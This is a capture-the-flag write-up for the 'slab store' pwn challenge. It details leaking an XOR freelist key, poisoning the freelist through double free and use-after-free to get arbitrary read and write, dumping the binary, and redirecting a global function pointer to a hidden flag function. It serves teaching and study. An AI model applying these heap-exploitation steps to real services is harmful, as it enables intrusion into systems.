---
title: "slab store"
description: "Connecting to the service prints a banner and a prompt:"
event: "isfcr"
category: "pwn"
categoryLabel: "Pwn"
tags: ["ISFCR CTF 2026","pwn"]
date: "2026-10-11"
teammate: true
source: "isfcr/writeups/slab.md"
---

**Category:** pwn
**Target:** `nc 0.cloud.chals.io 20535`
**Flag:**

```
isfcr{cust0m_sl4b_n0_gl1bc_r3c1p3_s4v3s_y0u}
```

---

## 1. Recon

Connecting to the service prints a banner and a prompt:

```
slab store. commands: alloc | free <i> | edit <i> <hex> | read <i> | report | quit
>
```

So this is a little in-memory "note store" with five commands:

| command | meaning |
|---|---|
| `alloc` | allocate an object, prints `idx N` |
| `free <i>` | free object `i` |
| `edit <i> <hex>` | hex-decode and write bytes into object `i` |
| `read <i>` | print object `i` as 96 bytes of hex |
| `report` | prints `nothing to report.` |
| `quit` | exit |

Behavioral probing established:

- Exactly **16** slots, indices `0..15`. `read 16` / `edit 16` / `free 16` return `bad index`.
- Each object is **96 (`0x60`) bytes**, contiguous in memory.
- The allocator is a **custom slab / freelist** (not glibc): a fresh connection hands out chunks in a fixed order, and every connection sees the **same addresses** → the service is `fork()`-per-connection with a fixed (non-randomized) mapping.
- `free <i>` writes an 8-byte value at offset 0 of the freed chunk: the freelist `next` pointer.
- **Double free is allowed** and `edit` on a freed chunk works — the classic primitives for freelist attacks.

## 2. The freelist is obfuscated (XOR)

After allocating all 16 objects and then freeing them all, the first 8 bytes of a freed chunk do **not** look like a real pointer. Decoding it reveals the trick: the allocator stores

```
stored_next = next ^ KEY
```

with a single constant `KEY` for the process. Deriving `KEY` and XOR-ing the stored values yields a clean, contiguous chain:

```
0x4b6ba0, 0x4b6c00, 0x4b6d60, ...   (0x4b6ba0 + 0x60*i)
```

so the 16 chunks live at `0x4b6ba0 + 0x60*i`, i.e. the slab spans `0x4b6ba0 .. 0x4b71a0`.

`KEY` is stored in a global at `0x4b6b90`, and it is regenerated when the process restarts (it changed once during this session). The exploit therefore **derives the key per instance at runtime** instead of hardcoding it:

> Free slot `15` first, while the freelist is empty. Its `next` is `NULL`, so the value it stores is `enc(0) == KEY`. Read slot 15 → `KEY`.

## 3. Arbitrary read via freelist poisoning

Because `stored_next = next ^ KEY`, an attacker who can write a freed chunk's first 8 bytes controls where the allocator goes next. Setting

```
chunk.next = enc(target)
```

makes the allocator pop `chunk`, then pop `target` on the following `alloc`. The returned slot now points at `target`, and `read` on that slot leaks `*target`.

The reliable in-connection primitive is:

```
alloc*16
free 15; free 14; ...; free 0     # slot v owns chunk v, list is LIFO
for each target a:
    edit 0 enc(a)                 # poison head
    alloc                         # slot0 <- chunk0, head := a
    alloc                         # slot v <- a
    read v                        # leak 96 bytes at a
    free 0                        # recycle
```

Reading unmapped addresses segfaults that connection — fine, the server forks per connection.

## 4. Dumping the binary

The mapping around the slab is the program itself. A page probe showed a contiguous mapped region `0x400000 .. ~0x4b8000` followed by unmapped memory. Using the primitive above I dumped **the entire running image** to `slab.bin` (`0x400000 .. 0x4b8000`, ~750 KB) in plain-text-base64-free form via pipelined connections.

Two optimizations made this fast:

- **Pipelining.** The per-command latency (~0.3 s) is round-trip latency, not server work. Sending an entire connection's command list at once and reading all replies collapses a whole connection to a few milliseconds.
- **Threading.** 60 workers on top of that: the full 750 KB dump took ~7 seconds.

The resulting flat image is directly analyzable: it is a **statically-linked** non-PIE x86-64 ELF, so file offset `= vaddr - 0x400000` for every loadable segment. `objdump -D -b binary -m i386:x86-64 --adjust-vma=0x400000` disassembles it directly.

## 5. Reading the driver

Disassembly of the command dispatcher (`~0x401e52`) shows a `strncmp`-style chain against the command names:

```
"alloc"  -> 0x401f03
"free "  -> 0x401fd1
"edit "  -> 0x40203e
"read "  -> 0x40216f
"report" -> call QWORD PTR [0x4b50d0]
```

The `report` path is the interesting one:

```asm
401ee8:  call QWORD PTR [rip+0xb31e2]   ; # 0x4b50d0
```

At load time `[0x4b50d0] == 0x401d6c`, a tiny stub whose only job is:

```asm
401d6c:  ... mov edi, 0x487258   ; "nothing to report."
         call 0x401d23           ; write_str(fd = [0x4b50c8])
         ret
```

So **`report` is an indirect call through a writable global function pointer.** That is the "never filed" thing the hint refers to.

## 6. The dead flag function

Scanning the image for the flag path (`grep` for the string `flag.txt` at `0x4872d4`) leads to a function at **`0x4022e6`** that nothing ever calls:

```asm
4022e6:  lea    rsp,[rsp-0xb8]
4022ee:  mov    rax, fs:0x28              ; stack canary
4022f7:  mov    [rsp+0xa8], rax
4022ff:  xor    eax,eax
402301:  mov    esi, 0x0                  ; "r"
402306:  mov    edi, 0x4872d4             ; "flag.txt"
40230b:  call   fopen
402310:  test   eax,eax
402312:  js     0x40235d                  ; on failure -> error string
...
40231e:  mov    rsi, rsp                  ; buf  = stack
402321:  mov    edx, 0xa0                 ; size = 160
402326:  mov    edi, eax                  ; FILE*
402328:  call   fread
...
402369:  mov    rsi, rsp                  ; buf
40236c:  mov    rdx, rax                  ; count
40236f:  mov    edi, [rip+...]           ; fd = [0x4b50c8] (the client socket)
402375:  call   write                   ; <-- prints the flag
```

The output fd `[0x4b50c8]` is the accepted **client socket** (set once per connection), so this function writes the flag straight back to us. It is never referenced anywhere in the binary — pure dead code left as the win condition.

## 7. Arbitrary write and control-flow hijack

The alloc primitive returns a slot that aliases an attacker-chosen address, and `edit` writes to the object that slot points at. So the arbitrary **read** becomes an arbitrary **write**: `edit <slot> <hex>` writes anywhere.

Hijack plan:

1. `alloc` all 16 objects.
2. `free 0`, `free 1` → freelist `chunk1 -> chunk0`.
3. `edit 1 enc(0x4b50d0)` → poison `chunk1.next` to the report pointer.
4. `alloc` → slot 0 gets `chunk1`, head := `0x4b50d0`.
5. `alloc` → slot 1 gets `0x4b50d0`.
6. `edit 1 e622400000000000` → write `0x4022e6` into `[0x4b50d0]`.
7. `report` → `call [0x4b50d0]` now jumps to the flag function → flag is written back.

## 8. Result

```
[*] freelist key = 0x057f4beffc053a68
[*] [0x4b50d0] <- 0x4022e6
[*] report => 'isfcr{cust0m_sl4b_n0_gl1bc_r3c1p3_s4v3s_y0u}'
[+] FLAG: isfcr{cust0m_sl4b_n0_gl1bc_r3c1p3_s4v3s_y0u}
```

## 9. Root cause & lessons

- **Custom allocator with XOR "safe-linking"** is not a mitigation: the key is a single process-wide constant, stored in memory, and the encoding is reversible. Derive it, and the freelist is yours.
- **Unprotected double free / UAF** (`edit` on a freed chunk) is enough to poison the freelist.
- **Indirect call through a writable global** (`call [0x4b50d0]`) is a one-write control-flow hijack. It should be a read-only pointer, or the target should live in `.rodata`/`RELRO`.
- The flag lived in a function that is never called — reachable only by redirecting control flow, exactly what the hint ("something that was never filed") suggests.

## 10. Files

- `exploit.py` — self-contained exploit (stdlib only). Usage: `python3 exploit.py [host] [port]`.

Helpful intermediate tooling used during the analysis (dynamic key derivation + arbitrary-read batcher + memory dumper) is folded into `exploit.py`; the flat memory image dump can be reproduced with the same arbitrary-read primitive if needed.
